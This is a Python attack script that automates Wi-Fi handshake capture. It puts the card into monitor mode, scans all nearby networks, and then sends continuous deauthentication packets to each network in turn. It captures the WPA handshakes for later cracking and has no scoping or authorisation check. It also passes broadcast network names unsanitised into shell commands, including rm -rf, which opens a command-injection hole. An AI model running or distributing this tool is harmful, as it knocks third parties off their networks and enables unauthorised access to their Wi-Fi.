import re
import os
import time
import subprocess
import csv

def sudo():
 if os.getuid() != 0:
  print("please run in sudo")
  exit()
sudo()
 
def monmode():
 s = os.popen("iwconfig").read()
 os.system("clear")
 global intface
 if re.search(r'\bwlan0\b',s):
  print("Running wlan0")
  time.sleep(2)
  print("killing processes and entering monitor mode")
  intface = "wlan0"
  subprocess.Popen(["sudo", "airmon-ng", "start", "wlan0"],stdout=subprocess.DEVNULL)
  subprocess.Popen(["sudo", "airmon-ng", "check", "kill"],stdout=subprocess.DEVNULL)
 else:
  print("Running wlan0mon")
  time.sleep(2)
  print("killing processes and entering monitor mode")
  intface = "wlan0mon"
  subprocess.Popen(["sudo", "airmon-ng", "start", "wlan0mon"],stdout=subprocess.DEVNULL)
  subprocess.Popen(["sudo", "airmon-ng", "check", "kill"],stdout=subprocess.DEVNULL)
monmode()

def handshake():
 os.system("rm -rf pwn-01.csv")
 time.sleep(1)
 names = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
 pwn = subprocess.Popen(["sudo", "airodump-ng", "-w", "pwn", "--write-interval", "1", "--output-format", "csv", f"{intface}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 print("\033[0;42mSCANNING ALL NETWORKS THEN TARGETING... PLEASE WAIT 5seconds...\033[0m")
 time.sleep(5) # um
 pwn.terminate()
 seen_essids = set()
 print("\n\033[0;35mPLEASE WAIT... AS SOON AS SSIDS POP UP IT WILL START ATTACKING\n ")
 print("\r                       ALL WIFIS TO ATTACK ")
 print("   ATTACKING")
 print("\r\033[0;33m ------------- ")
 while True:
  try:
   with open("pwn-01.csv", "r") as read_csv:
    sec_read = csv.DictReader(read_csv, names)
    next(sec_read)
    for rows in sec_read: 
      global essid # yes i know its global and not being used global lol just keep it here
      essid = rows["ESSID"]
      mac = rows["BSSID"].strip()
      ch = rows["channel"].strip()
      if essid:
       if essid not in seen_essids:
        print(f"\033[0;32m NOW ATTACKING {essid}")
        term = subprocess.Popen(["sudo", "airodump-ng", "-w", essid, "-c", ch, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        seen_essids.add(essid)

  
        time.sleep(0.022)
        term2 = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", mac, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(0.022)
        time.sleep(20)
        term.terminate()
        time.sleep(1)
        exit5 = subprocess.Popen(f"aircrack-ng '{essid}'-01.cap > handshake.txt",stdout=subprocess.DEVNULL, shell=True)
        time.sleep(0.88)
        exit5.terminate()
        time.sleep(3)
        with open("handshake.txt", "r") as f:
          regex_read = f.read()
        if re.search("(1 handshake)", regex_read):
         os.system("clear")
         print("         HANDSHAKES")
         print("--------------------------------")
         print(f"\033[33mCaptured Handshake For \033[0;35m{essid}")
         
         os.system(f"rm -rf '{essid}'-01.kismet.csv")
         os.system(f"rm -rf '{essid}'-01.log.csv")
         os.system(f"rm -rf '{essid}'-01.kismet.netxml")
         os.system(f"rm -rf '{essid}'-01.csv")
         os.system(f"rm -rf '{essid}'-02.cap")
         os.system(f"rm -rf ' -01.csv'")
         os.system(f"rm -rf ' -01.cap'")
         os.system(f"rm -rf ' -02.kismet.csv'")
         os.system(f"rm -rf ' -02.kismet.netxml'")
         os.system(f"rm -rf ' -02.log.csv'")
         os.system(f"rm -rf '{essid}'-02.kismet.csv")
         os.system(f"rm -rf '{essid}'-02.csv")
         os.system(f"rm -rf '{essid}'-02.kismet.netxml")
         os.system(f"rm -rf '{essid}'-02.log.csv")
       else: 
         os.system("clear")
         print(f"Didn't Capture Handshake From {essid}")
         os.system("rm -rf handshake.txt")
         os.system(f"rm -rf '{essid}'-01.kismet.csv")
         os.system(f"rm -rf '{essid}'-01.log.csv")
         os.system(f"rm -rf '{essid}'-01.kismet.netxml")
         os.system(f"rm -rf '{essid}'-01.csv")
         os.system(f"rm -rf '{essid}'-02.cap")
         os.system(f"rm -rf ' -01.csv'")
         os.system(f"rm -rf ' -01.cap'")
         os.system(f"rm -rf ' -01.log.csv'")
         os.system(f"rm -rf ' -01.kismet.csv'")
         os.system(f"rm -rf ' -01.kismet.netxml'")
         os.system(f"rm -rf ' -02.kismet.csv'")
         os.system(f"rm -rf ' -02.kismet.netxml'")
         os.system(f"rm -rf ' -02.log.csv'")
         os.system(f"rm -rf ' -02.csv'")
         os.system(f"rm -rf '{essid}'-02.kismet.csv")
         os.system(f"rm -rf '{essid}'-02.csv")
         os.system(f"rm -rf '{essid}'-02.kismet.netxml")
         os.system(f"rm -rf '{essid}'-02.log.csv")
         term.terminate()
         term2.terminate()
  except KeyboardInterrupt:
   exit()
handshake()
    
